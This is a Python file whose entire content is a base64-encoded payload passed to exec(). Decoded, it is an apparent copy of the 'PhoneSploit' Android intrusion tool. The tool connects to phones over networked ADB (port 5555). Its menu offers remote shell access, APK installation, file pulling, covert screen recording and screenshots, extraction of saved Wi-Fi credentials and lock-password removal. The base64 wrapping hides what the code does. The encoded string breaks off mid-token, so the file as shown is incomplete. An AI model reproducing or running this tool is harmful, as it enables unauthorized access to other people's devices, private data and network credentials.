import marshal, base64
exec(base64.b64decode("IyBjb2Rpbmc6IGxhdGluLTEKCiNDb2RlZCBCeSBTaHVCaGFtZzBzYWluCiMgRW5qb3kKCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KI0ltcG9ydHMKCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCB1cmxsaWIyCmltcG9ydCB0aW1lIGFzIHQKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgaW5pdAoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgVmFyaWFibGVzCkN1cnJlbnREaXIgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKSkKbG9hZF9jb3VudCA9IDAKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojSW5zdGFsbCBGdW5jdGlvbnMKIyBkZWYgQ29sb3JpbmdNb2RlU3RhcnR1cCgpOgojICAgICBjb2xvcmluZ19maWxlID0gb3BlbihDdXJyZW50RGlyKyJcXGluc3RhbGxcXGNvbG9yaW5nLnR4dCIsICJhKyIpCiMgICAgIGxpbmUgPSBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgImErIikucmVhZGxpbmUoKQojICAgICBpZiAndHJ1ZScgaW4gbGluZToKIyAgICAgICAgIGluaXQoY29udmVydD1UcnVlKQojICAgICAgICAgbWFpbigpCiMgICAgIGlmICdmYWxzZScgaW4gbGluZToKIyAgICAgICAgIHdpbmRvd3M9RmFsc2UKIyAgICAgICAgIG1haW4oKQojICAgICBpZiAiTk9UX0xPQURFRCIgaW4gbGluZToKIyAgICAgICAgIHBsYXRmb3JtX2Nob2ljZSA9IHJhd19pbnB1dCgiQXJlIHlvdSBsb2FkaW5nIHRoaXMgc2NyaXB0IGluIChXKWluZG93cyBvciAoTClpbnV4OiAiKQojICAgICAgICAgb3BlbihDdXJyZW50RGlyKyJcXGluc3RhbGxcXGNvbG9yaW5nLnR4dCIsICJ3IikuY2xvc2UoKQojICAgICAgICAgaWYgcGxhdGZvcm1fY2hvaWNlLmxvd2VyKCkgPT0gJ3cnOgojICAgICAgICAgICAgIGNvbG9yaW5nX2ZpbGUud3JpdGUoInRydWUiKQojICAgICAgICAgZWxzZToKIyAgICAgICAgICAgICBjb2xvcmluZ19maWxlLndyaXRlKCJmYWxzZSIpCiMgICAgICAgICAgICAgeW4gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJIYXZlIHlvdSBhbHJlYWR5IGluc3RhbGxlZCBhZGIgdmlhIGNvbW1hbmQgbGluZSAiK0ZvcmUuR1JFRU4gKyAiWSIrRm9yZS5XSElURSsiLyIrRm9yZS5SRUQrIk4gIitGb3JlLldISVRFKQojICAgICAgICAgICAgIGlmIHluID09ICJuIjoKIyAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJzdWRvIGFwdCBpbnN0YWxsIGFkYiIpCiMgICAgICAgICAgICAgZWxzZToKIyAgICAgICAgICAgICAgICAgbWFpbigpCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBHcmFwaGljcyAjIGh0dHA6Ly9wYXRvcmprLmNvbS9zb2Z0d2FyZS90YWFnLyNwPWRpc3BsYXkmZj1HcmFmZml0aSZ0PVR5cGUlMjBTb21ldGhpbmclMjAKCmFycm93ID0gRm9yZS5SRUQgKyAiIOKUlOKUgOKUgD4iLmRlY29kZSgidXRmLTgiKSArIEZvcmUuV0hJVEUKY29ubmVjdCA9IEZvcmUuUkVEICsgIuKUgiIuZGVjb2RlKCJ1dGYtOCIpICsgRm9yZS5XSElURQpwYWdlMiA9IEZhbHNlCgpsb2dvX2Rlc2lnbl8xID0gKCcnJwogIHswfSAgX19fXyAgX18gICAgICAgICAgICAgICAgCiAgIC8gX18gXC8gL18gIF9fX18gIF9fX18gIF9fXyAKICAvIC9fLyAvIF9fIFwvIF9fIFwvIF9fIFwvIF8gXAp7MX0gLyBfX19fLyAvIC8gLyAvXy8gLyAvIC8gLyAgIAovXy8gICAvXy8gL18vXF9fX18vXy8gL18vXF9fXy8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgL18vJycnKS5mb3JtYXQoRm9yZS5HUkVFTiwgRm9yZS5XSElURSwgRm9yZS5SRUQpCgpsb2dvX2Rlc2lnbl8yID0gRm9yZS5HUkVFTiArICcnJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIC47JyAgICAgICAgICAgICAgICAgICAgIGA7LAogLjsnICAsOycgICAgICAgICAgICAgYDssICBgOywgICB7MH1QaG9uZVNwbG9pdAouOycgICw7JyAgLDsnICAgICBgOywgIGA7LCAgYDssCjo6ICAgOjogICA6ICAgezF9KCApezB9ICAgOiAgIDo6ICAgOjogIHsxfUNvZGVkIGJ5IFp1Y2NjcyAvIE1ldGFjaGFyezB9Cic6LiAgJzouICAnOi4gezF9L19cezB9ICw6JyAgLDonICAsOicKICc6LiAgJzouICAgIHsxfS9fX19cezB9ICAgICw6JyAgLDonICAgCiAgJzouICAgICAgIHsxfS9fX19fX1x7MH0gICAgICAsOicKICAgICAgICAgICB7MX0vICAgICAgIFxcezB9CicnJy5mb3JtYXQoRm9yZS5HUkVFTiwgRm9yZS5XSElURSwgRm9yZS5SRUQpCgpsb2dvX2Rlc2lnbl9wcmUgPSAnJycKezB94pWU4pWQ4pWXezF94pSsIOKUrOKUjOKUgOKUkOKUjOKUkOKUjOKUjOKUgOKUkAp7MH3ilaDilZDilZ17MX3ilJzilIDilKTilIIg4pSC4pSC4pSC4pSC4pSc4pSkIAp7MH3ilakgIHsxfeKUtCDilLTilJTilIDilJjilJjilJTilJjilJTilIDilJgnJycuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQpsb2dvX2Rlc2lnbl8zID0gbG9nb19kZXNpZ25fcHJlLmRlY29kZSgidXRmLTgiKQoKbG9nb19kZXNpZ25fNCA9ICcnJwpcMDMzWzkybQogICAgICAgICAgK2h5ZE5OTk5keWgrCiAgICAgICAgK21NTU1NTU1NTU1NTU1tKwogICAgICBgZE1NbVwwMzNbMG06XDAzM1s5Mm1OTU1NTU1NTlwwMzNbMG06XDAzM1s5Mm1tTU1kYAogICAgICBoTU1NTU1NTU1NTU1NTU1NTU1NaAogIFwwMzNbOTJtLi4gIHl5eXl5eXl5eXl5eXl5eXl5eXl5ICAuLiAgICAgICAgICAgICAgXDAzM1swbSBFeHBsb2l0IHRpbWUgOikgXDAzM1s5Mm0KXDAzM1s5Mm0ubU1NbWBNTU1NTU1NTU1NTU1NTU1NTU1NTWBtTU1tLiAgICAgICAgICAgIFwwMzNbMG0gVGhhbmtzIGZvciBkb3dubG9hZGluZyFcMDMzWzkybQpcMDMzWzkybTpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06Ci1NTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU0tCiAreXkrIE1NTU1NTU1NTU1NTU1NTU1NTU1NICt5eSsKICAgICAgbU1NTU1NTU1NTU1NTU1NTU1NTW0KICAgICAgYC8rK01NTU1oKytoTU1NTSsrL2AKICAgICAgICAgIE1NTU1vICBvTU1NTQogICAgICAgICAgTU1NTW8gIG9NTU1NCiAgICAgICAgICBvTk1tLSAgLW1NTnMnJycKCmxvZ29fZGVzaWduXzUgPSAnJycKIHswfV9fX19fXyAgIHsxfV9fICBfXyAgICAgX19fX19fICAgICBfXyAgIF9fICAgICBfX19fX18gICAgIAp7MH0vXCAgPT0gXCB7MX0vXCBcX1wgXCAgIC9cICBfXyBcICAgL1wgIi0uXCBcICAgL1wgIF9fX1wgICAgCnswfVwgXCAgXy0vIHsxfVwgXCAgX18gXCAgXCBcIFwvXCBcICBcIFwgXC0uICBcICBcIFwgIF9fXCBfCiB7MH1cIFxfXCAgICB7MX1cIFxfXCBcX1wgIFwgXF9fX19fXCAgXCBcX1xcIlxfXCAgIFwgXF9fX19fXAogIHswfVwvXy8gICAgIHsxfVwvXy9cL18vICAgXC9fX19fXy8gICBcL18vIFwvXy8gICBcL19fX19fLyAKJycnLmZvcm1hdChGb3JlLldISVRFLCBGb3JlLkdSRUVOKQoKbG9nb19kZXNpZ25fNiA9IEZvcmUuUkVEICsgJycnCiAgICAgICAgICAgICAgICAgICAgICAsX19fXwogICAgICAgICAgICAgICAgICAgICAgfC0tLS5cXAogICAgICAgICAgICAgIF9fXyAgICAgfCAgICBgICAgICAgUEhPTkUKICAgICAgICAgICAgIC8gLi1cICAuLz0pCiAgICAgICAgICAgIHwgIHwifF8vXC98CiAgICAgICAgICAgIDsgIHwtO3wgL198ICAgICAgICAgUkVBUCBUSEUgUkVXQVJEUwogICAgICAgICAgIC8gXF98IHwvIFwgfAogICAgICAgICAgLyAgICAgIFwvXCggfAogICAgICAgICAgfCAgIC8gIHxgICkgfAogICAgICAgICAgLyAgIFwgXy8gICAgfAogICAgICAgICAvLS0uXy8gIFwgICAgfAogICAgICAgICBgL3wpICAgIHwgICAgLwogICAgICAgICAgIC8gICAgIHwgICB8CiAgICAgICAgIC4nICAgICAgfCAgIHwKICAgICAgICAvICAgICAgICAgXCAgfAogICAgICAgKF8uLS5fXy5fXy4vICAvCgonJycKCmxvZ29fZGVzaWduXzcgPSBGb3JlLkdSRUVOICsgJycnCiAgICAubyBvT09PT09PT28gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9PT28KICAgIE9iLk9PT09PT09vICBPT09vLiAgICAgIG9PT28uICAgICAgICAgICAgICAgICAgICAgIC5hZE9PT09PT08KICAgIE9ib08iIiIiIiIiIiIiIiIuT09vLiAub09PT09Pby4gICAgT09Pby5vT09PT09vLi4iIiIiIiIiIiInT08KICAgIE9PUC5vT09PT09PT09PT08gIlBPT09PT09PT09PT28uICAgYCJPT09PT09PT09QLE9PT09PT09PT09PQicKICAgIGBPJ09PT08nICAgICBgT09PT28iT09PT09PT09PT09gIC5hZE9PT09PT09PTyJvT09PJyAgICBgT09PT28KICAgIC5PT09PJyAgICAgICAgICAgIGBPT09PT09PT09PT09PT09PT09PT09PT09PTycgICAgICAgICAgICBgT08KICAgIE9PT09PICAgICAgICAgICAgICAgICAnIk9PT09PT09PT09PT09PT08iYCAgICAgICAgICAgICAgICBvT08KICAgb09PT09PYmEuICAgICAgICAgICAgICAgIC5hZE9PT09PT09PT09iYSAgICAgICAgICAgICAgIC5hZE9PT09vLgogIG9PT09PT09PT09PT09PYmEuICAgIC5hZE9PT09PT09PT09AXk9PT09PT09iYS4gICAgIC5hZE9PT09PT09PT09PTwogT09PT09PT09PT09PT09PT08uT09PT09PT09PT09PT08iYCAgJyJPT09PT09PT09PT09PLk9PT09PT09PT09PT09PCiAiT09PTyIgICAgICAgIllPb09PT09NT0lPTk9ET08iYCAgLiAgICciT09ST0FPUE9FT09Pb09ZIiAgICAgIk9PTyIKICAgIFkgICAgICAgICAgICdPT09PT09PT09PT09PTzogLm9PT28uIDpPT09PT09PT09PTz8nICAgICAgICAgOmAKICAgIDogICAgICAgICAgICAub08lT09PT09PT09PT28uT09PT09PLm9PT09PT09PT09PT08/ICAgICAgICAgLgogICAgLiAgICAgICAgICAgIG9PT1AiJU9PT09PT09Pb09PT09PT08/b09PT09PP09PT08iT09vCiAgICAgICAgICAgICAgICAgJyVvICBPT09PIiVPT09PJSIlT09PT08iT09PT09PIk9PTyc6CiAgICAgICAgICAgICAgICAgICAgICBgJCIgIGBPT09PJyBgTyJZICcgYE9PT08nICBvICAgICAgICAgICAgIC4KICAgIC4gICAgICAgICAgICAgICAgICAuICAgICBPUCIgICAgICAgICAgOiBvICAgICAuCgonJycKCnBhZ2VfMSA9ICcnJ1xuCnswfVt7MX0xezB9XSB7Mn1TaG93IENvbm5lY3RlZCBEZXZpY2VzICAgICAgezB9W3sxfTZ7MH1dIHsyfVNjcmVlbiByZWNvcmQgYSBwaG9uZSAgICAgICAgICAgICAgIHswfVt7MX0xMXswfV0gezJ9VW5pbnN0YWxsIGFuIGFwcCAgICAgICAgICAgICAgICAgICAKezB9W3sxfTJ7MH1dIHsyfURpc2NvbmVjdCBhbGwgZGV2aWNlcyAgICAgICB7MH1bezF9N3swfV0gezJ9U2NyZWVuIFNob3QgYSBwaWN0dXJlIG9uIGEgcGhvbmUgICAgezB9W3sxfTEyezB9XSB7Mn1TaG93IHJlYWwgdGltZSBsb2cgb2YgZGV2aWNlICAgICAgIAp7MH1bezF9M3swfV0gezJ9Q29ubmVjdCBhIG5ldyBwaG9uZSAgICAgICAgIHswfVt7MX04ezB9XSB7Mn1SZXN0YXJ0IFNlcnZlciAgICAgICAgICAgICAgICAgICAgICB7MH1bezF9MTN7MH1dIHsyfUR1bXAgU3lzdGVtIEluZm8gICAgICAgICAgICAgICAgICAgCnswfVt7MX00ezB9XSB7Mn1BY2Nlc3MgU2hlbGwgb24gYSBwaG9uZSAgICAgezB9W3sxfTl7MH1dIHsyfVB1bGwgZm9sZGVycyBmcm9tIHBob25lIHRvIHBjICAgICAgIHswfVt7MX0xNHswfV0gezJ9TGlzdCBhbGwgYXBwcyBvbiBhIHBob25lICAgICAgICAgICAKezB9W3sxfTV7MH1dIHsyfUluc3RhbGwgYW4gYXBrIG9uIGEgcGhvbmUgICB7MH1bezF9MTB7MH1dIHsyfVR1cm4gVGhlIERldmljZSBvZmYgICAgICAgICAgICAgICAgezB9W3sxfTE1ezB9XSB7Mn1SdW4gYW4gYXBwICAgICAgICAgICAgICAgICAgICAgICAgIAoKCnswfVt7MX05OXswfV0gezJ9RXhpdCAgIHswfVt7MX0wezB9XSB7Mn1DbGVhciAgIHswfVt7MX1wezB9XSBOZXh0IFBhZ2UgICAgICAgICAgICAgICAgICAgICAgICAgICB2MS4yCicnJy5mb3JtYXQoRm9yZS5DWUFOLCBGb3JlLlJFRCwgRm9yZS5HUkVFTikKCnBhZ2VfMiA9ICcnJ1xuCnswfVt7MX0xNnswfV17Mn0gUG9ydCBGb3J3YXJkaW5nICAgICAgICAgICAgICAgIHswfVt7MX0yMXswfV17Mn0gTmV0U3RhdCAKezB9W3sxfTE3ezB9XXsyfSBHcmFiIHdwYV9zdXBwbGljYW50ICAgICAgICAgICAgezB9W3sxfTIyezB9XXsyfSBUdXJuIFdpRmkgT24vT2ZmICAgICAgICAgICAgICAgICAKezB9W3sxfTE4ezB9XXsyfSBTaG93IE1hYy9JbmV0ICAgICAgICAgICAgICAgICAgezB9W3sxfTIzezB9XXsyfSBSZW1vdmUgUGFzc3dvcmQKezB9W3sxfTE5ezB9XXsyfSBFeHRyYWN0IGFwayBmcm9tIGFwcCAgICAgICAgICAgezB9W3sxfTI0ezB9XXsyfSBVc2UgS2V5Y29kZSAgICAgICAgICAgIAp7MH1bezF9MjB7MH1dezJ9IEdldCBCYXR0ZXJ5IFN0YXR1cyAgICAgICAgICAgICB7MH1bezF9MjV7MH1dezJ9IEdldCBDdXJyZW50IEFjdGl2aXR5ICAgICAgICAgICAgICAgICAgCgoKezB9W3sxfTk5ezB9XSB7Mn1FeGl0ICAgezB9W3sxfTB7MH1dIHsyfUNsZWFyICAgezB9W3sxfWJ7MH1dIEJhY2sgdG8gcGFnZSBvbmUKJycnLmZvcm1hdChGb3JlLkNZQU4sIEZvcmUuUkVELCBGb3JlLkdSRUVOKQoKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojTWFpbgpkZWYgbWFpbigpOgogICAgcGFnZV9udW0gPSAxCiAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKICAgIGlmIG9wdGlvbiA9PSAnMSc6CiAgICAgICAgb3Muc3lzdGVtKCJhZGIgZGV2aWNlcyAtbCIpCiAgICBlbGlmIG9wdGlvbiAgPT0gICcyJzoKICAgICAgICBvcy5zeXN0ZW0oImFkYiBkaXNjb25uZWN0IikKICAgIGVsaWYgb3B0aW9uID09ICczJzoKICAgICAgICBvcy5zeXN0ZW0oImFkYiB0Y3BpcCA1NTU1IikKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XSBFbnRlciBhIHBob25lcyBpcCBhZGRyZXNzLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgaXAgPSByYXdfaW5wdXQgKGFycm93KyIgcGhvbmUiK0ZvcmUuUkVEICsgIihjb25uZWN0X3Bob25lKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIGNvbm5lY3QgIitpcCsiOjU1NTUiKQogICAgCiAgICBlbGlmIG9wdGlvbiAgPT0gJzQnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoc2hlbGxfb25fcGhvbmUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIikKCiAgICBlbGlmIG9wdGlvbiA9PSAnNSc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihhcGtfaW5zdGFsbCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIHRoZSBhcGsgbG9jYXRpb24uIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBhcGtfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoYXBrX2luc3RhbGwpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgICIrZGV2aWNlX25hbWUrIiBpbnN0YWxsICIrYXBrX2xvY2F0aW9uKQogICAgICAgIHByaW50IChGb3JlLkdSRUVOICArICAiQXBrIGhhcyBiZWVuIGluc3RhbGxlZC4iKQoKICAgIGVsaWYgb3B0aW9uID09ICAnNic6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihzY3JlZW5fcmVjb3JkKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dIFBsZWFzZSB3YWl0IDNtIGl0cyByZWNvcmRpbmciKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc2NyZWVucmVjb3JkIC9zZGNhcmQvZGVtby5tcDQiKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciB3aGVyZSB5b3Ugd291bGQgbGlrZSB0aGUgdmlkZW8gdG8gYmUgc2F2ZWQuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwbGFjZV9sb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihzY3JlZW5fcmVjb3JkKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsIC9zZGNhcmQvZGVtby5tcDQgIitwbGFjZV9sb2NhdGlvbikKCiAgICBlbGlmIG9wdGlvbiAgPT0gJzcnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lIitGb3JlLlJFRCArICIoc2NyZWVuc2hvdCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc2NyZWVuY2FwIC9zZGNhcmQvc2NyZWVuLnBuZyIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciB3aGVyZSB5b3Ugd291bGQgbGlrZSB0aGUgc2NyZWVuc2hvdCB0byBiZSBzYXZlZC4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIHBsYWNlX2xvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKHNjcmVlbnNob3QpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHB1bGwgL3NkY2FyZC9zY3JlZW4ucG5nICIrcGxhY2VfbG9jYXRpb24pCgogICAgZWxpZiBvcHRpb24gPT0gJzgnOgogICAgICAgIG9zLnN5c3RlbSgiYWRiIGtpbGwtc2VydmVyICYmIGFkYiBzdGFydC1zZXJ2ZXIiKQogICAgCiAgICBlbGlmIG9wdGlvbiA9PSAnOSc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihmaWxlX3B1bGwpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIGZpbGUgbG9jYXRpb24gb24gYSBkZXZpY2UiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGZpbGVfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lIitGb3JlLlJFRCArICIoZmlsZV9wdWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIHByaW50ICgoIiAgICAgICAgIitjb25uZWN0KSkKICAgICAgICBwcmludCAoKCIgICAgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdvdWxkIGxpa2UgdGhlIGZpbGUgdG8gYmUgc2F2ZWQuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwbGFjZV9sb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihmaWxlX3B1bGwpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHB1bGwgIitmaWxlX2xvY2F0aW9uKyIgIitwbGFjZV9sb2NhdGlvbikKCiAgICBlbGlmIG9wdGlvbiA9PSAnMTAnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lIitGb3JlLlJFRCArICIoZGV2aWNlX3JlYm9vdCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyAiIHJlYm9vdCAiKQogICAgCiAgICBlbGlmIG9wdGlvbiA9PSAgJzExJzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKGFwcF9kZWxldGUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIHBhY2thZ2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIHBhY2thZ2VfbmFtZSA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihhcHBfZGVsZXRlKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiB1bmlzdGFsbCAiK3BhY2thZ2VfbmFtZSkKCiAgICBlbGlmIG9wdGlvbiA9PSAnMTInOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lIitGb3JlLlJFRCArICIobG9nKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgnYWRiIC1zICcrZGV2aWNlX25hbWUrIiBsb2djYXQgIikKCiAgICBlbGlmIG9wdGlvbiA9PSAnMTMnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lIitGb3JlLlJFRCArICIoc3lzX2luZm8pICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIGR1bXBzeXMiKSAgICAgICAgCgogICAgZWxpZiBvcHRpb24gPT0gJzE0JzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKHBhY2thZ2VfbWFuYWdlcikgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBwbSBsaXN0IHBhY2thZ2VzIC1mIikKICAgICAgICBtYWluKCkKCiAgICBlbGlmIG9wdGlvbiA9PSAnMTUnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lIitGb3JlLlJFRCArICIoYXBwX3J1bikgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIGEgcGFja2FnZSBuYW1lLiBUaGV5IGxvb2sgbGlrZSB0aGlzIC0tPiBjb20uc25hcGNoYXQuYW5kcm9pZCIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcGFja2FnZV9uYW1lID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZSIrRm9yZS5SRUQgKyAiKGFwcF9ydW4pICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIG1vbmtleSAtcCAiK3BhY2thZ2VfbmFtZSsiIC12IDUwMCIpCiAgICAgICAgbWFpbigpICAgICAgCgogICAgZWxpZiBvcHRpb24gPT0gJzE2JzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2Vfbm